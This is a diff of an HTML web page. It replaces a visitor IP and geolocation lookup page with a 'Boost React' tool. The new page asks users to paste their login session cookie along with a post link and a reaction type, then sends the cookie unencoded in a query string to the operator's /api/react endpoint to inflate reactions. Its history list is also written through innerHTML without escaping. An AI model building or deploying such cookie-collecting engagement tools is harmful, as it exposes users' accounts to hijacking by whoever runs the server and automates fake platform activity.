@@ -3,112 +3,350 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visitor Information</title>
+    <title>Boost React</title>
+    <!-- Include a more visually appealing font -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+    <!-- Use Bootstrap 5.3.0-alpha1 as a base -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
+    <!-- Add Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
     <style>
+        /* styles.css */
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Montserrat', sans-serif; /* Apply the new font */
+            background-color: #f5f5f5; /* Change background color */
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            /* Add animation for bubbles loop effect */
+            background-image: url('https://i.imgur.com/YQRhIy1.png');
+            background-size: cover; /* Adjust background size */
+            background-repeat: no-repeat; /* Prevent background repeat */
+            background-attachment: fixed; /* Keep background fixed */
+            background-position: center; /* Center the background image */
         }
-        h1 {
+
+        .container {
+            width: 80%; /* Make containers slightly narrower */
+            max-width: 600px;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px; /* Increase border radius */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Soften shadow */
+            opacity: 0; /* Initially hide containers */
+            transform: translateY(-50px); /* Move containers up */
+            transition: opacity 0.5s ease, transform 0.5s ease; /* Smooth transition */
+            border: 2px solid #00BFFF; /* Neon blue color */
+            box-shadow: 0 0 20px #00BFFF; /* Neon blue shadow */
+        }
+
+        h2 {
+            text-align: center;
+        }
+
+        form {
             margin-bottom: 20px;
         }
-        .info {
-            margin-bottom: 10px;
+
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 10px; /* Increase spacing between labels */
         }
-        .info strong {
+
+        input[type="text"],
+        select,
+        button[type="submit"] {
+            width: 100%; /* Make all fields and button the same width */
+            padding: 12px; /* Increase padding */
+            margin-bottom: 20px; /* Increase bottom margin */
+            border: 2px solid #ccc; /* Increase border thickness */
+            border-radius: 10px; /* Increase border radius */
+            box-sizing: border-box;
             display: block;
         }
+
+        button[type="submit"] {
+            background-color: #4caf50; /* Change button color */
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            /* Add some padding and icon */
+            padding: 12px 0; /* Updated padding */
+            position: relative;
+            display: flex; /* Make button a flex container */
+            justify-content: center; /* Center the content horizontally */
+            align-items: center; /* Center the content vertically */
+        }
+
+        button[type="submit"]::before {
+            content: "\f178"; /* Font Awesome icon code for spinner */
+            font-family: FontAwesome;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%); /* Center the spinner */
+            display: none;
+        }
+
+        button[type="submit"].loading::before {
+            display: block; /* Show spinner */
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* History Section */
+        .history-container {
+            margin-top: 30px;
+            border-top: 1px solid #ccc;
+            padding-top: 20px;
+            max-height: 300px; /* Set a fixed height */
+            overflow-y: auto; /* Enable vertical scrolling */
+        }
+
+        .history-entry {
+            margin-bottom: 10px;
+        }
+
+        .history-entry span {
+            font-weight: bold;
+        }
+
+        /* Toggle Bright Mode and Night Mode */
+        .toggle-mode {
+            position: fixed;
+            top: 20px; /* Adjust position from top */
+            right: 20px; /* Adjust position from right */
+            z-index: 9999; /* Ensure toggle button stays on top */
+        }
+
+        .toggle-mode button {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        /* Smoothly reveal containers */
+        body.show-containers .container {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Night Mode */
+        body.night-mode {
+            background-color: #111; /* Change background color */
+            color: #fff; /* Change text color */
+        }
+
+        body.night-mode .container {
+            background-color: #333; /* Change container background color */
+            color: #fff; /* Change container text color */
+        }
+        
+        /* Footer */
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 10px 20px;
+            text-align: center;
+            color: #87CEEB;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
     </style>
 </head>
-<body>
-    <h1>Visitor Information</h1>
-    <div class="info">
-        <strong>Device Information:</strong>
-        <p id="device-info">Loading...</p>
+<body class="bright-mode">
+    <div class="container">
+        <h2>Boost React</h2>
+        <form id="reactForm">
+            <label for="link">Link:</label>
+            <input type="text" id="link" name="link" required>
+            
+            <label for="type">Reaction:</label> <!-- Changed label for clarity -->
+            <select class="reaction-select" id="type" name="type" required>
+                <option value="">Select reaction</option>
+                <option value="LIKE">Like</option>
+                <option value="LOVE">Love</option>
+                <option value="CARE">Care</option>
+                <option value="HAHA">Haha</option>
+                <option value="WOW">Wow</option>
+                <option value="SAD">Sad</option>
+                <option value="ANGRY">Angry</option>
+            </select>
+            
+            <label for="cookie">Cookie:</label>
+            <input type="text" id="cookie" name="cookie" required>
+             
+            <button type="submit">Submit</button>
+        </form>
+        <div id="response" class="response"></div>
     </div>
-    <div class="info">
-        <strong>User Info:</strong>
-        <p id="ip-address">Loading...</p>
+
+    <!-- History Section -->
+    <div class="container history-container">
+        <h2>Reaction History</h2>
+        <div id="history" class="history"></div>
     </div>
-    <div class="info">
-        <strong>Google Map:</strong>
-        <p id="google-map">Loading...</p>
+
+    <!-- Toggle Bright Mode and Night Mode -->
+    <div class="toggle-mode">
+        <button id="modeToggle"><i class="fas fa-sun"></i></button>
     </div>
-    <div class="info">
-        <strong>Date & Time:</strong>
-        <p id="server-runtime">Loading...</p>
-    </div>
-    <div class="info">
-        <strong>Running Time:</strong>
-        <p id="server-run">Loading...</p>
-    </div>
+
+    <!-- Footer with date, time, and ping -->
+    <footer>
+        <div id="datetime"></div>
+        <div id="ping"></div>
+    </footer>
+
+    <!-- Move scripts to the end of body for better performance -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
     <script>
-        // Fetch device information
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const deviceInfo = `${userAgent} (${platform})`;
-        document.getElementById('device-info').innerText = deviceInfo;
+        // Load history when page loads
+        window.addEventListener('load', () => {
+            // Show containers smoothly after everything is loaded
+            document.body.classList.add('show-containers');
+            loadHistory();
+            measurePing(); // Start measuring ping
+            updateTime(); // Display date and time
+        });
 
-        // Fetch IP address and location information
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                fetch(`http://ip-api.com/json/${data.ip}?fields=66846719`)
-                    .then(response => response.json())
-                    .then(infoip => {
-                        const locationInfo = `<strong>Location Information:</strong>
-📡 IP Address: ${data.ip}<br>
-🌍 Location: ${infoip.city}, ${infoip.regionName}, ${infoip.country}<br>
-🌐 Continent: ${infoip.continent}<br>
-🏁 Country Code: ${infoip.countryCode}<br>
-🌆 Region/State: ${infoip.regionName}<br>
-🏙️ City: ${infoip.city}<br>
-🌏 District: ${infoip.district}<br>
-📮 ZIP code: ${infoip.zip}<br>
-🌐 Latitude: ${infoip.lat}<br>
-🌐 Longitude: ${infoip.lon}<br>
-⏰ Timezone: ${infoip.timezone}<br>
-🏢 Organization: ${infoip.org}<br>
-💰 Currency: ${infoip.currency}`;
-                        const mapLink = `Location Map:
-🗺️ <a href="https://www.google.com/maps?q=${infoip.lat},${infoip.lon}" target="_blank">View on Map</a>`;
-                        document.getElementById('ip-address').innerHTML = locationInfo;
-                        document.getElementById('google-map').innerHTML = mapLink;
-                    })
-                    .catch(error => {
-                        console.error('Error fetching IP address and location:', error);
-                        document.getElementById('ip-address').innerText = 'Error fetching IP address and location';
+        // Function to load history using API
+        function loadHistory() {
+            axios.get('/api/history')
+                .then(response => {
+                    const history = response.data;
+                    const historyContainer = document.getElementById('history');
+
+                    history.forEach(entry => {
+                        const historyEntry = document.createElement('div');
+                        historyEntry.classList.add('history-entry');
+                        historyEntry.innerHTML = `<span>Link:</span> ${entry.link}, <span>Reaction:</span> ${entry.type}`;
+                        historyContainer.appendChild(historyEntry);
                     });
-            })
-            .catch(error => {
-                console.error('Error fetching IP address:', error);
-                document.getElementById('ip-address').innerText = 'Error fetching IP address';
-            });
-
-        // Display date and time
-        const currentTime = new Date().toLocaleString();
-        document.getElementById('server-runtime').innerText = currentTime;
-
-        // Fetch server running time
-        fetch('/server-runtime')
-            .then(response => response.text())
-            .then(data => {
-                const serverRunTime = formatServerRunTime(data);
-                document.getElementById('server-run').innerText = serverRunTime;
-            })
-            .catch(error => {
-                console.error('Error fetching server runtime:', error);
-                document.getElementById('server-run').innerText = 'Error fetching server runtime';
-            });
-
-        // Function to format server running time
-        function formatServerRunTime(seconds) {
-            const hours = Math.floor(seconds / 3600);
-            const minutes = Math.floor((seconds % 3600) / 60);
-            const remainingSeconds = seconds % 60;
-            return `${hours}h ${minutes}m ${remainingSeconds}s`;
+                })
+                .catch(error => {
+                    console.error(error);
+                    Swal.fire({
+                      icon: "error",
+                      title: "Oops...",
+                      text: "Unable to load history!",
+                      footer: '<a href="https://www.facebook.com/learnfromber">Contact Developer</a>'
+                    });
+                });
         }
+
+        // Function to measure ping
+        function measurePing() {
+            var xhr = new XMLHttpRequest();
+            var startTime, endTime;
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    endTime = Date.now();
+                    var pingTime = endTime - startTime;
+                    document.getElementById("ping").textContent = "Ping: " + pingTime + " ms";
+                }
+            };
+            xhr.open("GET", location.href + "?t=" + new Date().getTime());
+            startTime = Date.now();
+            xhr.send();
+        }
+        setInterval(measurePing, 1000);
+
+        // Function to display date and time
+        function updateTime() {
+            const now = new Date();
+            const options = {
+                timeZone: 'Asia/Manila',
+                hour12: true,
+                hour: 'numeric',
+                minute: 'numeric',
+                second: 'numeric'
+            };
+            const formattedTime = now.toLocaleString('en-US', options);
+            document.getElementById('datetime').textContent = 'Date & Time: ' + formattedTime;
+        }
+        setInterval(updateTime, 1000);
+
+        document.getElementById("reactForm").addEventListener("submit", async function(event) {
+            event.preventDefault();
+
+            const button = document.querySelector('button[type="submit"]');
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i>'; // Change button text to spinner
+            button.disabled = true; // Disable button while loading
+
+            const link = document.getElementById("link").value;
+            const type = document.getElementById("type").value;
+            const cookie = document.getElementById("cookie").value;
+
+            try {
+             
+                const response = await axios.post('/api/react?link='+link+'&type='+type+'&cookie='+cookie);
+                const responseData = response.data;
+
+                if (responseData === 'Please wait until the countdown finishes.') {
+                    Swal.fire({
+                        icon: 'success',
+                        title: 'Success',
+                        text: responseData
+                    });
+                } else {
+                    Swal.fire({
+                        icon: "error",
+                        title: "Oops...",
+                        text: JSON.stringify(responseData),
+                        footer: '<a href="https://www.facebook.com/learnfromber">Contact Developer</a>'
+                    });
+                }
+            } catch (error) {
+                console.error(error);
+                Swal.fire({
+                    icon: "error",
+                    title: "Oops...",
+                    text: "Something went wrong!",
+                    footer: '<a href="https://www.facebook.com/learnfromber">Contact Developer</a>'
+                });
+            } finally {
+                button.innerHTML = 'Submit'; // Restore original button text
+                button.disabled = false; // Re-enable button
+            } 
+        });
+
+        const modeToggle = document.getElementById('modeToggle');
+        const body = document.body;
+
+        modeToggle.addEventListener('click', function() {
+            body.classList.toggle('bright-mode');
+            body.classList.toggle('night-mode');
+
+            // Change icon based on mode
+            if (body.classList.contains('night-mode')) {
+                modeToggle.innerHTML = '<i class="fas fa-moon"></i>';
+            } else {
+                modeToggle.innerHTML = '<i class="fas fa-sun"></i>';
+            }
+        });
+
     </script>
 </body>
 </html>
